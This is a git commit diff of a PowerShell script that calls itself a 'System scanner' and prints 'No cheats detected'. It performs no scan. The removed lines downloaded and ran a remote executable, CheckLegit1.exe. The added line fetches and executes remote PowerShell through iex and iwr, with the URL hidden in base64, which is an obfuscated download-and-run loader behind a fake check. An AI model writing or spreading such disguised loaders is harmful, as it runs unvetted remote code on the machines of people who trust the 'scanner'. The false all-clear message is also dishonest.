3a22d52b2b1d56e855acf0eee10bb94ed3f0c1ff
fundrug35-jpg <fundrug35@gmail.com>
2026-09-09 21:21:04 +0300

    Add files via upload

--- run.ps1
+++ run.ps1
@@ -1,4 +1,3 @@
 Write-Host "System scanner" -ForegroundColor Cyan
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/ccc/main/CheckLegit1.exe" -OutFile "$env:TEMP\CheckLegit1.exe" -UseBasicParsing
-& "$env:TEMP\CheckLegit1.exe"
+iex (iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1bmRydWczNS1qcGcvY2NjL21haW4vcnVuLnBzMQ=="))))
 Write-Host "No cheats detected" -ForegroundColor Green
